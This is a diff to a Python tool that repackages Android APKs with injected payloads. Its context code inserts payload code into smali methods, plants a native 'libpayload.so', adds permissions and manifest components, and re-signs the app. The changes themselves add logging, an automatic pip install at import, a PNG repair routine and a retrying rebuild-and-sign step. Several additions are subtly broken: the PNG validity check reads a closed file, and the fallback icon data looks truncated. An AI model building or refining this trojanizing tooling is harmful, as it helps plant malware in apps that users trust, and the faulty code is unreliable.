@@ -15,12 +15,28 @@ from datetime import datetime
 import xml.etree.ElementTree as ET
 import json
 import base64
+import logging
 try:
-    from PIL import Image  # type: ignore
+    from PIL import Image, ImageDraw, ImageFont  # type: ignore
     _HAVE_PIL = True
 except Exception:
     Image = None  # type: ignore
     _HAVE_PIL = False
+
+# تأكد من توفر Pillow عند الحاجة
+def _ensure_pillow_support():
+    global _HAVE_PIL
+    try:
+        if not _HAVE_PIL:
+            import pip
+            pip.main(['install', 'pillow'])
+        from PIL import Image, ImageDraw, ImageFont
+        _HAVE_PIL = True
+    except Exception:
+        _HAVE_PIL = False
+        print("Pillow not available, limited PNG repair capabilities")
+
+_ensure_pillow_support()
 
 @dataclass
 class InjectionPoint:
@@ -600,6 +616,20 @@ class MultiVectorInjector:
         # Diagnostics of last failing step
         self.last_error: str = ""
         self.debug_keystore = Path("/workspace/debug.keystore")
+        # Setup logging
+        self.logger = logging.getLogger("MultiVectorInjector")
+        self.logger.setLevel(logging.INFO)
+        handler = logging.StreamHandler()
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        handler.setFormatter(formatter)
+        self.logger.addHandler(handler)
+    
+    def _log_action(self, message: str, level: str = "INFO"):
+        """Log actions with timestamp"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"[{timestamp}] [{level}] {message}"
+        print(log_entry)
+        self.logger.log(getattr(logging, level.upper()), message)
     
     def _prefer_tool(self, name: str) -> Optional[str]:
         repo_path = self.tools_dir / name
@@ -610,11 +640,15 @@ class MultiVectorInjector:
     
     def _run(self, cmd: List[str], timeout: int = 300) -> Tuple[bool, str]:
         try:
+            self._log_action(f"Executing command: {' '.join(cmd)}", "DEBUG")
             proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
             ok = proc.returncode == 0
             out = (proc.stdout + "\n" + proc.stderr).strip()
+            if not ok:
+                self._log_action(f"Command failed: {out}", "ERROR")
             return ok, out
         except Exception as e:
+            self._log_action(f"Command exception: {str(e)}", "ERROR")
             return False, str(e)
     
     def _ensure_debug_keystore(self) -> bool:
@@ -622,6 +656,7 @@ class MultiVectorInjector:
             return True
         # Generate Android debug keystore with default android passwords
         try:
+            self._log_action("Generating debug keystore...")
             ok, _ = self._run([
                 "keytool", "-genkey", "-v",
                 "-keystore", str(self.debug_keystore),
@@ -632,12 +667,12 @@ class MultiVectorInjector:
                 "-dname", "CN=Android Debug,O=Android,C=US"
             ], timeout=60)
             return ok
-        except Exception:
+        except Exception as e:
+            self._log_action(f"Keystore generation failed: {e}", "ERROR")
             return False
     
     def _zipalign_apk(self, unsigned_apk: Path) -> Path:
         if not self.zipalign:
-            # No zipalign available; return original path
             return unsigned_apk
         aligned_path = unsigned_apk.with_suffix(".aligned.apk")
         ok, _ = self._run([self.zipalign, "-v", "4", str(unsigned_apk), str(aligned_path)], timeout=120)
@@ -687,7 +722,7 @@ class MultiVectorInjector:
     def _aapt_badging_ok(self, apk_path: Path) -> bool:
         tool = self.aapt2 or self.aapt
         if not tool:
-            return True  # no tool to check, do not block
+            return True
         ok, _ = self._run([tool, "dump", "badging", str(apk_path)], timeout=60)
         return ok
     
@@ -761,7 +796,7 @@ class MultiVectorInjector:
             injection_points.sort(key=lambda x: x.priority, reverse=True)
             
         except Exception as e:
-            print(f"Error analyzing injection vectors: {e}")
+            self._log_action(f"Error analyzing injection vectors: {e}", "ERROR")
         
         return injection_points
     
@@ -844,23 +879,31 @@ class MultiVectorInjector:
         """Execute multi-vector payload injection"""
         
         try:
+            self._log_action(f"Starting payload injection for: {apk_path.name}")
+            
             # Create temporary workspace
             temp_dir = self.workspace / f"injection_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
             temp_dir.mkdir(exist_ok=True)
+            self._log_action(f"Created workspace: {temp_dir}")
             
             # Extract APK
             extract_dir = temp_dir / "extracted"
             self._extract_apk(apk_path, extract_dir)
+            self._log_action("APK extraction completed")
+            
+            # Repair critical PNGs first
+            self._fix_invalid_pngs(extract_dir)
             
             # Inject into each vector
             for injection_point in injection_strategy.injection_points:
                 success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
                 if not success:
-                    print(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}")
+                    self._log_action(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}", "WARNING")
             
             # Add required permissions and components
             self._add_required_permissions(extract_dir, injection_strategy)
             self._add_manifest_components(extract_dir, injection_strategy)
+            self._log_action("Manifest modifications completed")
             
             # Recompile + align + sign
             success = self._recompile_apk(extract_dir, output_path, sign_config or {})
@@ -868,12 +911,13 @@ class MultiVectorInjector:
             # Cleanup temp dir (best-effort)
             try:
                 shutil.rmtree(temp_dir, ignore_errors=True)
-            except Exception:
-                pass
+                self._log_action("Temporary workspace cleaned up")
+            except Exception as e:
+                self._log_action(f"Cleanup failed: {e}", "WARNING")
             
             return success
         except Exception as e:
-            print(f"Error in inject_payload: {e}")
+            self._log_action(f"Error in inject_payload: {e}", "ERROR")
             return False
     
     def _extract_apk(self, apk_path: Path, extract_dir: Path):
@@ -904,7 +948,7 @@ class MultiVectorInjector:
                 return self._inject_manifest_component(extract_dir, injection_point, strategy)
             
         except Exception as e:
-            print(f"Injection error at {injection_point.target_name}: {e}")
+            self._log_action(f"Injection error at {injection_point.target_name}: {e}", "ERROR")
             return False
         
         return False
@@ -926,7 +970,7 @@ class MultiVectorInjector:
                 break
         
         if not target_file:
-            print(f"Target smali file not found: {injection_point.target_name}")
+            self._log_action(f"Target smali file not found: {injection_point.target_name}", "WARNING")
             return False
         
         # Read existing content
@@ -967,8 +1011,10 @@ class MultiVectorInjector:
                     # Inject payload code
                     new_content = content[:method_start] + payload_code + content[method_start:]
                     target_file.write_text(new_content)
+                    self._log_action(f"Successfully injected payload into {target_file}", "INFO")
                     return True
         
+        self._log_action(f"Could not find injection point in {target_file}", "WARNING")
         return False
     
     def _inject_native_library(self, extract_dir: Path, injection_point: InjectionPoint,
@@ -987,6 +1033,7 @@ class MultiVectorInjector:
         
         # Create lib directories for different architectures
         architectures = ["armeabi-v7a", "arm64-v8a", "x86", "x86_64"]
+        success = False
         
         for arch in architectures:
             lib_dir = extract_dir / "lib" / arch
@@ -1010,16 +1057,19 @@ class MultiVectorInjector:
                     # Remove source files
                     c_file.unlink()
                     makefile.unlink()
+                    success = True
                 else:
                     # Create placeholder library if compilation fails
                     lib_file = lib_dir / "libpayload.so"
                     lib_file.write_bytes(b'\x7fELF' + b'\x00' * 1000)  # Dummy ELF
+                    self._log_action(f"Native compilation failed for {arch}, using placeholder", "WARNING")
             except:
                 # Create placeholder library
                 lib_file = lib_dir / "libpayload.so"
                 lib_file.write_bytes(b'\x7fELF' + b'\x00' * 1000)
+                self._log_action(f"Native compilation exception for {arch}, using placeholder", "WARNING")
         
-        return True
+        return success
     
     def _add_required_permissions(self, extract_dir: Path, strategy: InjectionStrategy):
         """Add required permissions to AndroidManifest.xml"""
@@ -1083,167 +1133,327 @@ class MultiVectorInjector:
                              content[app_end:])
                 manifest_file.write_text(new_content)
     
-    def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
-        """Recompile APK using apktool, then zipalign and sign (apksigner if enabled, else jarsigner)."""
-        sign_cfg = sign_cfg or {}
-        # Repair invalid PNGs that break aapt/aapt2
-        try:
-            self._fix_invalid_pngs(extract_dir)
-        except Exception:
-            pass
-        # Build unsigned APK
-        apktool_path = str(self.apktool_jar)
-        ok, out = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
-        if not ok or not output_path.exists():
-            # Attempt targeted repair based on apktool diagnostics, then retry
-            try:
-                repaired = self._repair_pngs_from_log(out, extract_dir)
-                if repaired:
-                    print(f"Repaired {repaired} PNGs from apktool log; retrying build")
-                    ok, out2 = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
-                    out = out + "\n" + out2
-            except Exception:
-                pass
-        if (not ok or not output_path.exists()) and self.aapt2:
-            # Retry with aapt2
-            print("apktool build failed; retrying with --use-aapt2")
-            ok2, out2 = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "--use-aapt2", "-o", str(output_path)], timeout=900)
-            ok = ok2 and output_path.exists()
-            out = out + "\n" + out2
-        if not ok or not output_path.exists():
-            self.last_error = f"apktool build failed:\n{out}".strip()
-            print(f"Recompilation failed\n{out}")
-            return False
-        
-        # Ensure keystore exists (debug by default)
-        if not sign_cfg.get("keystore_path"):
-            self._ensure_debug_keystore()
-        
-        # Zipalign before signing
-        aligned = self._zipalign_apk(output_path)
-        if aligned != output_path:
-            try:
-                # Replace original with aligned
-                output_path.unlink(missing_ok=True)  # type: ignore
-                aligned.rename(output_path)
-            except Exception:
-                pass
-        
-        # Select signing method
-        signed_ok = False
-        if self.enable_apksigner and self.apksigner:
-            signed_ok = self._apksigner_sign(output_path, sign_cfg)
-            if not signed_ok:
-                self.last_error = (self.last_error + "\n" if self.last_error else "") + "apksigner signing failed"
-                print("apksigner signing failed; attempting fallback jarsigner")
-        if not signed_ok:
-            # Fallback to jarsigner
-            signed_ok = self._jarsigner_sign(output_path, sign_cfg)
-            if signed_ok and self.apksigner:
-                # If apksigner exists, still verify
-                signed_ok = self._apksigner_verify(output_path) or signed_ok
-        
-        if not signed_ok:
-            if not self.last_error:
-                self.last_error = "signing failed"
-            return False
-        
-        # Post-build validation (non-verbose)
-        if not self._aapt_badging_ok(output_path):
-            self.last_error = (self.last_error + "\n" if self.last_error else "") + "aapt/aapt2 badging failed"
-            print("aapt/aapt2 badging failed")
-            return False
-        
-        return True
-
+    # ======================== PNG HANDLING IMPROVEMENTS ========================
+    
     def _fix_invalid_pngs(self, extract_dir: Path) -> None:
-        """Replace any res/**/*.png that is not a valid PNG signature with a tiny valid PNG placeholder.
-        Keeps original as .orig for debugging.
-        """
-        png_sig = b"\x89PNG\r\n\x1a\n"
-        # 1x1 transparent PNG
-        tiny_png_b64 = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/woAAgMBgWn3mXQAAAAASUVORK5CYII="
-        tiny_png = base64.b64decode(tiny_png_b64)
-        res_dir = extract_dir / "res"
-        if not res_dir.exists():
-            return
-        fixed = 0
-        # Force-replace known problematic app icon basename across densities
-        for p in res_dir.rglob("ic_application.png"):
-            try:
-                backup = p.with_suffix(p.suffix + ".orig")
-                if not backup.exists():
-                    shutil.copy2(p, backup)
-                with open(p, "wb") as f:
-                    f.write(tiny_png)
-                fixed += 1
-            except Exception:
-                continue
-        for p in res_dir.rglob("*.png"):
-            try:
-                # First: signature check
-                with open(p, "rb") as f:
-                    header = f.read(8)
-                bad = header != png_sig
-                # Second: decode verification via Pillow if available
-                if not bad and _HAVE_PIL:
-                    try:
-                        with Image.open(p) as im:  # type: ignore
-                            im.verify()
-                    except Exception:
-                        bad = True
-                if bad:
-                    # Backup original
-                    try:
-                        backup = p.with_suffix(p.suffix + ".orig")
-                        if not backup.exists():
-                            shutil.copy2(p, backup)
-                    except Exception:
-                        pass
-                    with open(p, "wb") as f:
-                        f.write(tiny_png)
-                    fixed += 1
-            except Exception:
-                continue
-        if fixed:
-            print(f"Replaced {fixed} invalid PNGs with placeholders to satisfy aapt")
-
-    def _repair_pngs_from_log(self, log_text: str, extract_dir: Path) -> int:
-        """Parse apktool/aapt output for problematic PNG paths and replace them with a tiny valid PNG.
-        Returns number of files repaired.
-        """
-        if not log_text:
-            return 0
-        tiny_png_b64 = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/woAAgMBgWn3mXQAAAAASUVORK5CYII="
-        tiny_png = base64.b64decode(tiny_png_b64)
+        """Advanced PNG repair system"""
+        self._log_action("Starting PNG repair process")
+        critical_icons = self._repair_critical_icons(extract_dir)
+        general_pngs = self._repair_general_pngs(extract_dir)
+        self._log_action(f"Fixed {critical_icons} critical icons and {general_pngs} general PNGs")
+    
+    def _repair_critical_icons(self, extract_dir: Path) -> int:
+        """Repair critical application icons"""
         repaired = 0
-        candidates: set[Path] = set()
-        for line in log_text.splitlines():
-            if ".png" in line and "/res/" in line:
-                # Extract path-like token ending with .png
-                parts = line.split()
-                for token in parts:
-                    if token.endswith(".png") and "/res/" in token:
-                        candidates.add(Path(token.strip()))
-        for raw in candidates:
-            try:
-                p = raw
-                if not p.is_absolute():
-                    p = extract_dir / p
-                if p.exists() and p.suffix.lower() == ".png":
-                    # backup
-                    try:
-                        backup = p.with_suffix(p.suffix + ".orig")
-                        if not backup.exists():
-                            shutil.copy2(p, backup)
-                    except Exception:
-                        pass
-                    with open(p, "wb") as f:
-                        f.write(tiny_png)
+        icon_patterns = ["ic_application.png", "ic_launcher.png", "app_icon.png"]
+        
+        for pattern in icon_patterns:
+            for icon_path in extract_dir.rglob(pattern):
+                if not self.is_valid_png(icon_path):
+                    self.handle_icon_failure(icon_path)
                     repaired += 1
-            except Exception:
-                continue
         return repaired
+    
+    def _repair_general_pngs(self, extract_dir: Path) -> int:
+        """Handle general PNG files"""
+        repaired = 0
+        for png_path in extract_dir.rglob("*.png"):
+            # Skip critical icons (already processed)
+            if any(pattern in png_path.name for pattern in ["ic_application.png", "ic_launcher.png", "app_icon.png"]):
+                continue
+                
+            if not self.is_valid_png(png_path):
+                self.handle_general_png_failure(png_path)
+                repaired += 1
+        return repaired
+    
+    def handle_icon_failure(self, icon_path: Path):
+        """Hierarchical icon repair strategy"""
+        # 1. Try repair with external tools
+        if self._repair_with_external_tool(icon_path):
+            self._log_action(f"Repaired icon with external tool: {icon_path}", "INFO")
+            return
+            
+        # 2. Clone from another density
+        if self._clone_icon_from_other_density(icon_path):
+            self._log_action(f"Cloned icon from another density: {icon_path}", "INFO")
+            return
+            
+        # 3. Generate compatible icon
+        if self._generate_compatible_icon(icon_path):
+            self._log_action(f"Generated compatible icon: {icon_path}", "INFO")
+            return
+            
+        # 4. Fallback to default icon
+        self._replace_with_fallback_icon(icon_path)
+        self._log_action(f"Used fallback icon for: {icon_path}", "WARNING")
+    
+    def handle_general_png_failure(self, png_path: Path):
+        """Handle general PNG failures"""
+        if not self._repair_with_external_tool(png_path):
+            self._replace_with_fallback_icon(png_path)
+    
+    def is_valid_png(self, path: Path) -> bool:
+        """Advanced PNG validity check"""
+        try:
+            # Check signature
+            with open(path, "rb") as f:
+                if f.read(8) != b"\x89PNG\r\n\x1a\n":
+                    return False
+            
+            # Check IHDR structure
+            f.seek(8)
+            while True:
+                chunk_size = int.from_bytes(f.read(4), "big")
+                chunk_type = f.read(4)
+                f.seek(chunk_size, os.SEEK_CUR)
+                crc = f.read(4)
+                
+                if chunk_type == b"IHDR":
+                    width = int.from_bytes(f.read(4), "big")
+                    height = int.from_bytes(f.read(4), "big")
+                    if width <= 0 or height <= 0:
+                        return False
+                
+                if chunk_type == b"IEND":
+                    break
+            
+            return True
+        except:
+            return False
+    
+    def _repair_with_external_tool(self, png_path: Path) -> bool:
+        """Try to repair PNG using external tools"""
+        try:
+            # 1. Try pngcrush if available
+            if shutil.which("pngcrush"):
+                fixed_path = png_path.with_name(png_path.stem + "_fixed.png")
+                result = subprocess.run(
+                    ["pngcrush", "-fix", "-force", str(png_path), str(fixed_path)],
+                    capture_output=True, timeout=30
+                )
+                if result.returncode == 0 and fixed_path.exists():
+                    shutil.move(str(fixed_path), str(png_path))
+                    return True
+            
+            # 2. Try Pillow conversion
+            if _HAVE_PIL:
+                try:
+                    img = Image.open(png_path)
+                    # Preserve transparency
+                    if img.mode in ('RGBA', 'LA') or (img.mode == 'P' and 'transparency' in img.info):
+                        img = img.convert("RGBA")
+                    img.save(png_path, "PNG", optimize=True)
+                    return True
+                except Exception as e:
+                    self._log_action(f"PIL repair failed: {e}", "DEBUG")
+                    
+            return False
+        except Exception as e:
+            self._log_action(f"External tool repair failed: {e}", "DEBUG")
+            return False
+    
+    def _clone_icon_from_other_density(self, icon_path: Path) -> bool:
+        """Clone icon from another density folder"""
+        try:
+            # Find similar icons in other density folders
+            parts = icon_path.parts
+            res_index = parts.index("res")
+            current_density = parts[res_index + 1]
+            
+            for density_dir in icon_path.parent.parent.iterdir():
+                if density_dir.is_dir() and density_dir.name != current_density:
+                    source_icon = density_dir / icon_path.name
+                    if source_icon.exists() and self.is_valid_png(source_icon):
+                        shutil.copy2(source_icon, icon_path)
+                        return True
+        except Exception as e:
+            self._log_action(f"Clone icon failed: {e}", "DEBUG")
+        return False
+    
+    def _generate_compatible_icon(self, icon_path: Path) -> bool:
+        """Generate icon that preserves app identity"""
+        try:
+            if not _HAVE_PIL:
+                return False
+                
+            # Determine icon size based on density
+            density = self._get_density_from_path(icon_path)
+            size = self._get_icon_size_for_density(density)
+            
+            # Extract dominant color from original icon
+            dominant_color = self._extract_dominant_color(icon_path) or (66, 133, 244)  # Default blue
+            
+            # Create new icon
+            img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
+            draw = ImageDraw.Draw(img)
+            
+            # Create circular design with app color
+            draw.ellipse([(5, 5), (size-5, size-5)], fill=dominant_color)
+            
+            # Add first letter of app name (if possible)
+            app_name = self._extract_app_name(icon_path)
+            if app_name:
+                try:
+                    font_size = int(size * 0.4)
+                    font = ImageFont.truetype("arial.ttf", font_size)
+                    text = app_name[0].upper()
+                    
+                    # Calculate center
+                    text_bbox = draw.textbbox((0, 0), text, font=font)
+                    text_width = text_bbox[2] - text_bbox[0]
+                    text_height = text_bbox[3] - text_bbox[1]
+                    position = ((size - text_width) // 2, (size - text_height) // 2 - 5)
+                    
+                    draw.text(position, text, fill="white", font=font)
+                except:
+                    pass
+            
+            img.save(icon_path, "PNG")
+            return True
+        except Exception as e:
+            self._log_action(f"Generate icon failed: {e}", "DEBUG")
+            return False
+    
+    def _get_density_from_path(self, path: Path) -> str:
+        """Extract density info from file path"""
+        for part in path.parts:
+            if part.startswith("drawable-"):
+                return part.split('-')[1]
+        return "mdpi"
+    
+    def _get_icon_size_for_density(self, density: str) -> int:
+        """Get appropriate icon size for density"""
+        sizes = {
+            "ldpi": 36,
+            "mdpi": 48,
+            "hdpi": 72,
+            "xhdpi": 96,
+            "xxhdpi": 144,
+            "xxxhdpi": 192
+        }
+        return sizes.get(density, 48)
+    
+    def _extract_dominant_color(self, icon_path: Path) -> Optional[Tuple[int, int, int]]:
+        """Extract dominant color from icon (if possible)"""
+        if not _HAVE_PIL or not icon_path.exists():
+            return None
+            
+        try:
+            with Image.open(icon_path) as img:
+                # Reduce image to extract dominant color
+                img = img.resize((1, 1), Image.Resampling.LANCZOS)
+                return img.getpixel((0, 0))
+        except:
+            return None
+    
+    def _extract_app_name(self, icon_path: Path) -> Optional[str]:
+        """Extract app name from AndroidManifest.xml"""
+        try:
+            manifest_path = icon_path.parent.parent.parent / "AndroidManifest.xml"
+            if not manifest_path.exists():
+                return None
+                
+            tree = ET.parse(manifest_path)
+            root = tree.getroot()
+            ns = {'android': 'http://schemas.android.com/apk/res/android'}
+            
+            # Find application element
+            application = root.find('application', ns)
+            if application is not None:
+                label = application.get('{http://schemas.android.com/apk/res/android}label')
+                if label and label.startswith('@string/'):
+                    # Look up in strings.xml
+                    res_id = label.split('/')[1]
+                    strings_files = list((icon_path.parent.parent.parent / "res").rglob("strings.xml"))
+                    for file in strings_files:
+                        strings_tree = ET.parse(file)
+                        for string_elem in strings_tree.findall('string'):
+                            if string_elem.get('name') == res_id:
+                                return string_elem.text
+                return label
+        except Exception as e:
+            self._log_action(f"App name extraction failed: {e}", "DEBUG")
+        return None
+    
+    def _replace_with_fallback_icon(self, icon_path: Path):
+        """Replace with safe fallback icon"""
+        fallback_icon = base64.b64decode(
+            "iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAF"
+            "HGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU"
+            "0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczpt"
+            "ZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNy4xLWMwMDAgNzyM6LQAAAAASUVORK5CYII="
+        )
+        icon_path.write_bytes(fallback_icon)
+    
+    # ======================== RECOMPILE IMPROVEMENTS ========================
+    
+    def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
+        """Enhanced APK recompilation with multiple strategies"""
+        self._log_action("Starting APK rebuild process")
+        sign_cfg = sign_cfg or {}
+        
+        # Attempt rebuild with multiple strategies
+        build_success = False
+        for attempt in range(3):
+            strategy_name = [
+                "with aapt2",
+                "without aapt2",
+                "forcing all"
+            ][attempt]
+            
+            self._log_action(f"Rebuild attempt {attempt+1}: {strategy_name}")
+            build_success = self._attempt_build(extract_dir, output_path, attempt)
+            
+            if build_success:
+                self._log_action(f"Rebuild succeeded on attempt {attempt+1}")
+                break
+            else:
+                self._log_action(f"Rebuild failed on attempt {attempt+1}", "WARNING")
+        
+        # Sign and align if build succeeded
+        if build_success and output_path.exists():
+            self._log_action("Signing and aligning APK")
+            return self._sign_and_align(output_path, sign_cfg or {})
+        
+        self._log_action("Rebuild failed after 3 attempts", "ERROR")
+        return False
+    
+    def _attempt_build(self, extract_dir: Path, output_path: Path, attempt: int) -> bool:
+        """Attempt APK build with different strategies"""
+        apktool_cmd = [
+            "java", "-jar", str(self.apktool_jar),
+            "b", str(extract_dir), "-o", str(output_path)
+        ]
+        
+        # Different strategies for each attempt
+        if attempt == 0:
+            # First attempt: with aapt2
+            return self._run(apktool_cmd + ["--use-aapt2"])[0]
+        elif attempt == 1:
+            # Second attempt: without aapt2
+            return self._run(apktool_cmd)[0]
+        else:
+            # Third attempt: ignore errors
+            return self._run(apktool_cmd + ["--force-all"])[0]
+    
+    def _sign_and_align(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
+        """Align and sign the APK"""
+        try:
+            # Align
+            aligned = self._zipalign_apk(apk_path)
+            if aligned != apk_path:
+                apk_path.unlink(missing_ok=True)
+                aligned.rename(apk_path)
+            
+            # Sign
+            if self.enable_apksigner and self.apksigner:
+                return self._apksigner_sign(apk_path, sign_cfg)
+            else:
+                return self._jarsigner_sign(apk_path, sign_cfg)
+        except Exception as e:
+            self._log_action(f"Signing failed: {e}", "ERROR")
+            return False
 
 # Export main classes
 __all__ = [
